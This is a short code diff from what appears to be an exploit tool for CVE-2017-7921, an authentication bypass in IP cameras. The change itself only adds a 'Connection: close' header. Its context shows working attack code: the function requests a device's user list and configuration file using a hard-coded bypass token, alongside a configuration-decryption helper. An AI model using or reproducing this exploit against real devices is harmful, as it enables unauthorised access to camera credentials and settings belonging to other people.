@@ -50,7 +50,7 @@ def config_decryptor(data):
 
 
 def cve_2017_7921(ip: str) -> list:
-    headers = {'User-Agent': config.USERAGENT}
+    headers = {'Connection': 'close', 'User-Agent': config.USERAGENT}
     user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
     config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
     timeout = config.TIMEOUT
